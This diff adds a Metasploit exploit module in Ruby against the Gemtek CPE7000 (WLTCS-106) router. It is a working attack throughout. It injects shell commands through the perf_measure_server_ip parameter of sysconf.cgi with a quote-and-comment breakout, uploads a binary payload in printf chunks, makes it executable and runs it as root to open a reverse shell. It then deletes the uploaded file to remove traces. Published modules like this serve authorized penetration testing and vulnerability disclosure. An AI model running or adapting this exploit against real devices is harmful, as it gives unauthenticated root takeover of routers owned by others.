@@ -1,0 +1,231 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Gemtek CPE7000 - WLTCS-106 sysconf.cgi Unauthenticated Remote Command Execution',
+      'Description' => %q{
+          A vulnerability exists for Gemtek CPE7000 model ID WLTCS-106
+        exposing Iperf tool to unauthenticated users. Injecting a
+        command in the perf_measure_server_ip parameter, an attacker
+        can execute arbitrary commands. Since the service runs as root,
+        the remote command execution has the same administrative privileges.
+        The remote shell is obtained uploading the payload and executing it.
+        A reverse shell is preferred rather then a bind one, since firewall
+        won't allow (by default) incoming connections.
+
+        Tested on Hardware version V02A and Firmware version 01.01.02.082.
+      },
+      'Author'      =>
+        [
+          'Federico Scalco <fscalco [ at] mentat.is>'
+          #Based on the exploit by Federico Ramondino <framondino [at ] mentat.is>
+        ],
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          [ 'EDB', '39716' ],
+          [ 'URL', 'http://www.mentat.is/docs/cpe7000-multiple-vulns.html' ],
+          [ 'URL' , 'http://www.gemtek.com.tw/' ]
+        ],
+      'DisclosureDate' => 'Apr 07 2016',
+      'Privileged'     => false,
+      'Platform'       => %w{ linux },
+      'Payload'        =>
+        {
+          'DisableNops' => true
+        },
+      'Targets'        =>
+        [
+          [ 'Linux arm Payload',
+            {
+            'Arch' => ARCH_ARMLE,
+            'Platform' => 'linux'
+            }
+          ],
+        ],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' =>
+      {
+        'RPORT' => 443,
+        'SHELL' => '/bin/sh'
+      }
+    ))
+
+    register_options(
+      [
+        OptInt.new('CMD_DELAY', [false, 'Time that the Handler will wait for the incoming connection', 15]),
+        OptInt.new('CHUNKS_DELAY', [false, 'Timeout between payload\'s chunks sending requests', 2]),
+        OptString.new('UPFILE', [ false, 'Payload filename on target server, (default: random)' ]),
+        OptInt.new('CHUNK_SIZE', [ false, 'Payload\'s chunk size (in bytes, default: 50)', 50 ]),
+        OptBool.new('SSL', [true, 'Use SSL', true])
+      ], self.class)
+
+  end
+
+  def request_resource(resname)
+    begin
+      res = send_request_cgi({
+        'uri'    => resname,
+        'method' => 'GET',
+      })
+      return res
+    rescue ::Rex::ConnectionError
+      vprint_error("#{@rhost}:#{rport} - Failed to connect to the web server")
+      return nil
+    end
+  end
+
+  def cleanup
+    print_status("#{@rhost}:#{rport} - Cleanup fase, trying to remove traces...")
+
+    begin
+      clean_target(@upfile)
+    rescue
+      vprint_error("#{@rhost}:#{rport} - Failed to clean traces (/www/#{@upfile}). The resource must be removed manually")
+    end
+    return
+  end
+
+  def clean_target(resname)
+    res = request_resource(resname)
+    if res and res.code != 404
+      print_status("#{rhost}:#{rport} - Found resource " + resname + ". Cleaning up now")
+      #remove
+      cmd = '"; rm /www/' + resname +' &> /dev/null #'
+      res = act(cmd, "deleting resource")
+      if (!res)
+        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to delete resource /www/#{resname} (have to do it manually)")
+      end
+    end
+  end
+
+  def set_conditions(buffer)
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => '/cgi-bin/sysconf.cgi',
+    'encode_params' => true,
+      'vars_get' => {
+        'page' => 'ajax.asp',
+        'action' => 'save_iperf_value',
+        'perf_measure_server_ip' => buffer,
+        'perf_measure_server_port' => '5555',
+        'perf_measure_cpe_port' => '5554',
+        'perf_measure_test_time' => '60',
+        'perf_measure_protocol_type' => '1',
+        'perf_measure_packet_data_length' => '1024',
+        'perf_measure_bandwidth' => '19m',
+        'perf_measure_client_num' => '1'
+    }
+    })
+
+    if !res or res.code != 200
+      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way to set_condition request")
+    end
+
+    return res
+  end
+
+  def toggle_once
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => '/cgi-bin/sysconf.cgi',
+      'vars_get' => {
+        'page' => 'ajax.asp',
+        'action' => 'perf_measure_status_toggle'
+    }
+    })
+
+    if !res or res.code != 200
+      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way to toggle request")
+    end
+
+    if res.body == "1"
+      @retoggled = false
+      return true
+    elsif !@retoggled
+      #print_status("#{@rhost}:#{rport} - First toggle request returned 0, retoggling now...")
+      @retoggled = true
+      toggle_once()
+    else
+      fail_with(Failure::UnexpectedReply, "Toggler cgi did not respond in an expected way")
+    end
+
+  end
+
+  def act(buffer, step)
+    set_conditions(buffer)
+    res = toggle_once()
+    return res
+  end
+
+  def exploit
+
+    @retoggled = false;
+    @cmd_delay = datastore['CMD_DELAY'] || 15
+    @chunk_size = datastore['CHUNK_SIZE'] || 50
+    @rhost = datastore['RHOST']
+    @rport = datastore['RPORT']
+    @upfile = datastore['UPFILE'] || rand_text_alpha(8+rand(8))
+    chunk_delay = datastore['CHUNKS_DELAY'] || 2
+
+    clean_target(@upfile)
+
+    pl = payload.encoded_exe
+    chunks = pl.scan(/.{1,#{@chunk_size}}/)
+    hash = Hash[chunks.map.with_index.to_a]
+
+    print_status("Total payload chunks: " + chunks.length.to_s )
+    print_status("#{rhost}:#{rport} - Uploading chunked payload on the gemtek device (/www/#{@upfile})")
+
+    for chk in chunks
+      chind = hash[chk]
+      safe_buffer = chk.each_byte.map { |b| '\x' + b.to_s(16) }.join
+
+      if chind == 0
+        s_redir = '>'
+      else
+        s_redir = '>>'
+      end
+
+      cmd = '"; printf \'' + safe_buffer + '\' ' + s_redir + ' /www/' + @upfile + ' #'
+
+      print_status("#{@rhost}:#{rport} - Uploading chunk " + (chind + 1).to_s + "/" + chunks.length.to_s + ('.' * (chind + 1)))
+      res = act(cmd, "uploading shell")
+      if (!res)
+       fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
+      end
+      select(nil, nil, nil, chunk_delay)
+    end
+
+    #chmod request
+    cmd = '"; chmod 777 /www/' + @upfile + ' & #'
+    print_status("#{rhost}:#{rport} - Asking the gemtek device to chmod #{@upfile}")
+    res = act(cmd, "chmodding payload")
+    if (!res)
+      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to chmod payload")
+    end
+
+    select(nil, nil, nil, @cmd_delay)
+
+    #phone home
+    cmd = '"; /www/' + @upfile + ' & #'
+    print_status("#{rhost}:#{rport} - Asking the gemtek device to execute #{@upfile}")
+    res = act(cmd, "executing payload")
+    if (!res)
+      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
+    end
+
+    select(nil, nil, nil, @cmd_delay)
+
+  end
+end
